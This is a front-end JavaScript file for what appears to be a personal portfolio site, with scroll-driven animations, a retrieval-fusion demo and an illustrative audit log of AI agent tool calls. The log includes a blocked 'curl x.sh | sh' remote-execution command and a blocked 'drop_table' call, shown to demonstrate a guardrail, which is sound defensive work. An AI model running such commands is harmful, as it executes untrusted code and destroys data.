import { LINKS } from "./config.js";
import { createField, WORLDS, roomTransform, ROOM_LABELS } from "./particles.js";
import { createOcean } from "./ocean.js";
import { createResearch, createProjects } from "./worlds.js";
import { renderAll } from "./render.js";

// Build every section from js/content.js before anything measures the page.
renderAll();

const reduced = matchMedia("(prefers-reduced-motion: reduce)").matches;
const isMobile = () => window.innerWidth < 860;
const isPortrait = () => window.innerHeight > window.innerWidth;

// On-screen text blocks; in portrait the particles slide out from behind these.
const textBlocks = [...document.querySelectorAll(".col > :not(.sonar), .sonar > .ping, .center > :not(.foot)")];
function textRects() {
  const out = [], vh = window.innerHeight;
  for (const el of textBlocks) {
    const r = el.getBoundingClientRect();
    if (r.bottom < 0 || r.top > vh || r.height === 0) continue;
    out.push([r.left, r.top, r.right, r.bottom]);
    if (out.length === 16) break;
  }
  return out;
}
const root = document.documentElement;

// ---------- links ----------
document.querySelectorAll("[data-link]").forEach((el) => {
  const url = LINKS[el.dataset.link];
  if (url) el.href = url;
});
document.getElementById("yr").textContent = new Date().getFullYear();

// ---------- colour helpers ----------
const hex2rgb = (h) => [1, 3, 5].map((i) => parseInt(h.slice(i, i + 2), 16));
const mixRGB = (a, b, t) => a.map((v, i) => v + (b[i] - v) * t);
const rgbStr = (c) => `rgb(${c.map((v) => Math.round(v)).join(",")})`;
const clamp01 = (x) => Math.min(1, Math.max(0, x));
const smooth = (x) => x * x * (3 - 2 * x);
const RGB = {};
for (const [k, w] of Object.entries(WORLDS)) {
  RGB[k] = { bg: hex2rgb(w.bg), bg2: hex2rgb(w.bg2 || w.bg), fg: hex2rgb(w.fg), accent: hex2rgb(w.accent) };
}

// ---------- sections ----------
const sections = [...document.querySelectorAll("[data-world]")];
let geo = [];
function measure() {
  geo = sections.map((s) => {
    const top = s.getBoundingClientRect().top + window.scrollY;
    return { world: s.dataset.world, top, h: s.offsetHeight, center: top + s.offsetHeight / 2 };
  });
}
measure();
window.addEventListener("resize", measure);
window.addEventListener("load", measure);

// ---------- 3D field ----------
let field = null;
try {
  field = createField(document.getElementById("field"), { mobile: isMobile() });
} catch (e) {
  console.warn("WebGL unavailable, continuing without the particle field", e);
}

// ---------- mapping labels ----------
const labelsEl = document.getElementById("labels");
const labelEls = ROOM_LABELS.map((l) => {
  const d = document.createElement("div");
  d.className = "lbl"; d.innerHTML = l.html;
  labelsEl.appendChild(d);
  return d;
});

// ---------- fixed UI ----------
const side = document.querySelector(".side");
const depth = document.querySelector(".depth");
const depthFill = document.querySelector(".depth-fill");
const depthVal = document.querySelector(".depth-val span");
const ocean = createOcean(document.getElementById("ocean"), { reduced });
const research = createResearch(document.getElementById("research"), { reduced });
const projects = createProjects(document.getElementById("projects"), { reduced });
const rFill = research.meter.querySelector(".m-fill"), rVal = research.meter.querySelector(".m-val span");
const pFill = projects.meter.querySelector(".m-fill");

// Keep each world's animation in step with its content: when a section grows or
// shrinks (new blocks, fonts loading, window resize), re-measure and re-lay it out.
let relayoutQueued = false;
const relayout = new ResizeObserver(() => {
  if (relayoutQueued) return;
  relayoutQueued = true;
  requestAnimationFrame(() => { relayoutQueued = false; measure(); research.rebuild(); projects.rebuild(); ocean.rebuild(); });
});
sections.forEach((s) => relayout.observe(s));
const IMMERSIVE = new Set(["research", "projects", "ocean"]);

// pane toggle: top-right "menu" inside immersive worlds, bottom-right "hide/show panel" elsewhere
const paneBtn = document.querySelector(".pane-btn");
const paneLabel = paneBtn.querySelector("span");
let paneOverlay = false, paneHidden = false, inImmersive = false;
paneBtn.addEventListener("click", () => { if (inImmersive) paneOverlay = !paneOverlay; else paneHidden = !paneHidden; });
side.addEventListener("click", (e) => { if (e.target.closest("a") && inImmersive) paneOverlay = false; });
const sideFixed = () => getComputedStyle(side).position === "fixed";
const termPath = document.querySelector(".term-path");
const navLinks = [...document.querySelectorAll(".side-nav a")];
const spySections = [...document.querySelectorAll("main section[id]")];
const SPY_PATH = { ocean: "vakan" };
let lastSpy = "";

let smoothY = window.scrollY;
let lastKey = "";
const t0 = performance.now();

function frame(now) {
  const t = reduced ? 0 : (now - t0) / 1000;
  smoothY += (window.scrollY - smoothY) * (reduced ? 1 : 0.14);
  const vc = smoothY + window.innerHeight / 2;

  // find the section under the viewport centre; blend only near its edges,
  // so tall sections (the ocean dive) hold their world the whole way through
  const W = window.innerHeight * 0.3;
  let k = 0;
  while (k < geo.length - 1 && vc >= geo[k + 1].top) k++;
  const cur = geo[k];
  let A = cur, B = cur, mix = 0;
  if (k < geo.length - 1 && vc > cur.top + cur.h - W) {
    B = geo[k + 1]; mix = smooth(clamp01((vc - (cur.top + cur.h - W)) / (2 * W)));
  } else if (k > 0 && vc < cur.top + W) {
    A = geo[k - 1]; mix = smooth(clamp01((vc - (cur.top - W)) / (2 * W)));
  }
  const prog = (g) => clamp01((vc - g.top) / g.h);
  const pA = prog(A), pB = prog(B);

  // blend theme colours
  const colA = RGB[A.world], colB = RGB[B.world];
  const bgA = mixRGB(colA.bg, colA.bg2, pA), bgB = mixRGB(colB.bg, colB.bg2, pB);
  const key = `${A.world}|${B.world}|${mix.toFixed(3)}|${pA.toFixed(3)}|${pB.toFixed(3)}`;
  if (key !== lastKey) {
    lastKey = key;
    root.style.setProperty("--bg", rgbStr(mixRGB(bgA, bgB, mix)));
    root.style.setProperty("--fg", rgbStr(mixRGB(colA.fg, colB.fg, mix)));
    root.style.setProperty("--accent", rgbStr(mixRGB(colA.accent, colB.accent, mix)));
  }

  // ocean extras
  const oceanG = geo.find((g) => g.world === "ocean");
  const wOcean = (A.world === "ocean" ? 1 - mix : 0) + (B.world === "ocean" ? mix : 0);
  if (oceanG) {
    const po = prog(oceanG);
    depth.style.opacity = wOcean.toFixed(2);
    depthFill.style.height = `${po * 100}%`;
    depthVal.textContent = Math.round(po * 40);
    if (wOcean > 0) ocean.update(po, t);
  }

  // research + projects worlds
  const weight = (w) => (A.world === w ? 1 - mix : 0) + (B.world === w ? mix : 0);
  const wR = weight("research"), wP = weight("projects");
  const gR = geo.find((g) => g.world === "research"), gP = geo.find((g) => g.world === "projects");
  research.meter.style.opacity = wR.toFixed(2);
  projects.meter.style.opacity = wP.toFixed(2);
  if (wR > 0) { const pr = prog(gR); research.update(pr, t); rFill.style.height = `${pr * 100}%`; rVal.textContent = Math.round(pr * 5000).toLocaleString("en-US"); }
  if (wP > 0) { const pp = prog(gP); projects.update(pp, t); pFill.style.height = `${pp * 100}%`; }

  // sidebar: slides away in the immersive worlds (desktop layout only); the pane button can bring it back
  const wImm = [...IMMERSIVE].reduce((s, w) => s + weight(w), 0);
  if (sideFixed()) {
    const imm = wImm > 0.5;
    if (imm !== inImmersive) { inImmersive = imm; paneOverlay = false; }
    const auto = smooth(clamp01(wImm * 1.6));
    const h = imm ? (paneOverlay ? 0 : auto) : (paneHidden ? 1 : auto);
    side.style.opacity = (1 - h).toFixed(3);
    side.style.transform = h > 0 ? `translateX(${(-h * 40).toFixed(1)}px)` : "";
    side.style.pointerEvents = h > 0.5 ? "none" : "";
    side.classList.toggle("overlay", imm && paneOverlay);
    document.body.classList.toggle("pane-hidden", !imm && paneHidden);
    paneBtn.classList.toggle("top", imm);
    const label = imm ? (paneOverlay ? "close" : "menu") : (paneHidden ? "show panel" : "hide panel");
    if (paneLabel.textContent !== label) { paneLabel.textContent = label; paneBtn.setAttribute("aria-expanded", String(h < 0.5)); }
  } else if (side.style.opacity) { side.style.opacity = ""; side.style.transform = ""; side.style.pointerEvents = ""; }

  // scroll-spy: terminal path + active nav item
  const probe = window.scrollY + window.innerHeight * 0.35;
  let spy = spySections[0];
  for (const s of spySections) if (s.getBoundingClientRect().top + window.scrollY <= probe) spy = s;
  if (window.innerHeight + window.scrollY >= document.documentElement.scrollHeight - 4) spy = spySections[spySections.length - 1];
  if (spy && spy.id !== lastSpy) {
    lastSpy = spy.id;
    termPath.textContent = SPY_PATH[spy.id] || spy.id;
    navLinks.forEach((a) => a.classList.toggle("active", a.dataset.spy === spy.id));
  }

  // particle field + mapping labels
  if (field) {
    field.render({ A: A.world, B: B.world, mix, pA, pB, t, pan: isMobile() || isPortrait() ? 0 : -2.9, dim: isMobile() ? 0.6 : 1, rects: isPortrait() ? textRects() : null });
    const wMap = (A.world === "mapping" ? 1 - mix : 0) + (B.world === "mapping" ? mix : 0);
    const showLabels = wMap > 0.6 && !isMobile();
    labelsEl.style.opacity = showLabels ? smooth((wMap - 0.6) / 0.4).toFixed(2) : "0";
    if (showLabels) {
      const pm = A.world === "mapping" ? pA : pB;
      const tmp = [0, 0, 0];
      ROOM_LABELS.forEach((l, i) => {
        roomTransform(l.pos[0], l.pos[1], l.pos[2], pm, tmp);
        const [sx, sy] = field.project(tmp[0], tmp[1], tmp[2]);
        labelEls[i].style.transform = `translate(${sx}px, ${sy - 8}px) translate(-50%, -100%)`;
      });
    }
  }
  requestAnimationFrame(frame);
}
requestAnimationFrame(frame);

// ---------- reveal on scroll ----------
const io = new IntersectionObserver((entries) => {
  entries.forEach((e) => { if (e.isIntersecting) { e.target.classList.add("in"); io.unobserve(e.target); } });
}, { threshold: 0.15 });
document.querySelectorAll(".reveal").forEach((el) => io.observe(el));

// ---------- count-ups ----------
const fmt = (v, dec) => dec > 0 ? v.toFixed(dec) : Math.round(v).toLocaleString("en-US");
const countIO = new IntersectionObserver((entries) => {
  entries.forEach((e) => {
    if (!e.isIntersecting) return;
    countIO.unobserve(e.target);
    const el = e.target, to = +el.dataset.to, from = +(el.dataset.from || 0), dec = +(el.dataset.dec || 0);
    if (reduced) { el.textContent = fmt(to, dec); return; }
    const start = performance.now(), dur = 1800;
    const step = (now) => {
      const k = clamp01((now - start) / dur), e3 = 1 - Math.pow(1 - k, 3);
      el.textContent = fmt(from + (to - from) * e3, dec);
      if (k < 1) requestAnimationFrame(step);
    };
    requestAnimationFrame(step);
  });
}, { threshold: 0.6 });
document.querySelectorAll(".count").forEach((el) => countIO.observe(el));

// ---------- RRF demo (real formula, illustrative data) ----------
const RRF_K = 60;
const DENSE = [["r214", "dentist moved to Thu 4pm"], ["r502", "gym is on Thursdays"], ["r031", "dentist booked for Tue"]];
const BM25 = [["r031", "dentist booked for Tue"], ["r214", "dentist moved to Thu 4pm"], ["r377", "dentist insurance card"]];
function rrfFuse() {
  const score = {}, text = {};
  [DENSE, BM25].forEach((list) => list.forEach(([id, txt], r) => {
    score[id] = (score[id] || 0) + 1 / (RRF_K + r + 1); text[id] = txt;
  }));
  return Object.entries(score).sort((a, b) => b[1] - a[1]).slice(0, 3).map(([id, s]) => [id, text[id], s]);
}
const olD = document.querySelector(".rrf-dense"), olB = document.querySelector(".rrf-bm25"), olF = document.querySelector(".rrf-fused");
const li = (id, txt, extra = "") => `<li><b>${id}</b> ${txt}${extra}</li>`;
olD.innerHTML = DENSE.map(([id, t]) => li(id, t)).join("");
olB.innerHTML = BM25.map(([id, t]) => li(id, t)).join("");
olF.innerHTML = rrfFuse().map(([id, t, s]) => li(id, t, `<em>${s.toFixed(4)}</em>`)).join("");
olF.firstElementChild.classList.add("top");
const rrfItems = [...olD.children, ...olB.children, ...olF.children];
let rrfTimer = null;
function playRRF() {
  rrfItems.forEach((x) => x.classList.remove("on"));
  rrfItems.forEach((x, i) => setTimeout(() => x.classList.add("on"), reduced ? 0 : 250 + i * 220 + (i >= 6 ? 500 : 0)));
}
new IntersectionObserver((entries) => {
  entries.forEach((e) => {
    clearInterval(rrfTimer);
    if (e.isIntersecting) { playRRF(); if (!reduced) rrfTimer = setInterval(playRRF, 7000); }
  });
}, { threshold: 0.4 }).observe(document.querySelector(".rrf"));

// ---------- AgentShield audit log (illustrative) ----------
const CALLS = [
  ['search_docs("refund policy")', "allow", "schema ok · read-only · in scope"],
  ['send_email(to="all@corp.com")', "review", "external side-effect · broad audience"],
  ['shell("curl x.sh | sh")', "block", "untrusted provenance · policy: no remote exec"],
  ['read_file("q3_report.md")', "allow", "authorized for session · read-only"],
  ['transfer_funds(amount=9800)', "review", "risk score high · human approval required"],
  ['db.drop_table("users")', "block", "policy: destructive op denied"],
  ['calendar.create("sync, Fri")', "allow", "low risk · user-initiated"],
  ['http_post(url=<from webpage>)', "block", "argument provenance: untrusted content"],
];
const logEl = document.querySelector(".audit-log");
const counts = { allow: 0, review: 0, block: 0 };
const countEls = document.querySelectorAll(".audit-counts b");
let ci = 0, auditTimer = null;
function pushCall() {
  const [call, v, why] = CALLS[ci++ % CALLS.length];
  counts[v]++;
  countEls[0].textContent = counts.allow; countEls[1].textContent = counts.review; countEls[2].textContent = counts.block;
  const item = document.createElement("li");
  item.innerHTML = `<span>→ ${call}</span><span class="v v-${v}">${v.toUpperCase()}</span><span class="why">${why}</span>`;
  logEl.prepend(item);
  while (logEl.children.length > 5) logEl.lastElementChild.remove();
}
new IntersectionObserver((entries) => {
  entries.forEach((e) => {
    clearInterval(auditTimer);
    if (e.isIntersecting) {
      if (!logEl.children.length) for (let i = 0; i < 3; i++) pushCall();
      if (!reduced) auditTimer = setInterval(pushCall, 1600);
    }
  });
}, { threshold: 0.3 }).observe(document.querySelector(".audit"));

// ---------- copy email ----------
document.querySelectorAll(".copy").forEach((btn) => {
  btn.addEventListener("click", async () => {
    try { await navigator.clipboard.writeText(btn.dataset.copy); btn.textContent = "copied ✓"; }
    catch { btn.textContent = "select & copy"; }
    btn.classList.add("done");
    setTimeout(() => { btn.textContent = "copy"; btn.classList.remove("done"); }, 1800);
  });
});
